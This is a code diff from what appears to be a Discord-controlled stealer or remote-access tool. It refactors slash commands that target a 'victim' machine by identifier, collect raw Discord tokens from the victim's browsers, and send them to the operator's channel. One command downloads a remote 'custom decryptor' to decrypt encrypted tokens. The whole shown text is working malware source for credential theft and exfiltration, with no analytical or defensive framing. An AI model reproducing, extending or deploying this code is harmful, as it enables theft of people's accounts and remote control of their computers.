@@ -9,17 +9,19 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class RawTokens(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Sends raw Discord Tokens from browsers (fast)",
-        options=[bot.victim],
-    )
+    @commands.slash_command( )
     async def raw_tokens(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Sends raw Discord Tokens from browsers (fast)
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
-            message, tokens = "", find_token()
+            message, tokens = "", self.bot.find_token()
             for token in tokens: 
                 message += token + "\n"
             if len(message) >= 1000: 
@@ -31,13 +33,17 @@ class RawTokens(commands.Cog):
             
             await ctx.followup.send(embed=embed)
 
-    @commands.slash_command(
-        description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens",
-        options=[bot.victim],
-    )
+    @commands.slash_command( )
     async def raw_discord(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """[EXPERIMENTAL] Decrypts encrypted Discord Tokens
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
+            
             try:
                 tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
                 await ctx.channel.send("Status:\n> Downloaded custom decryptor")
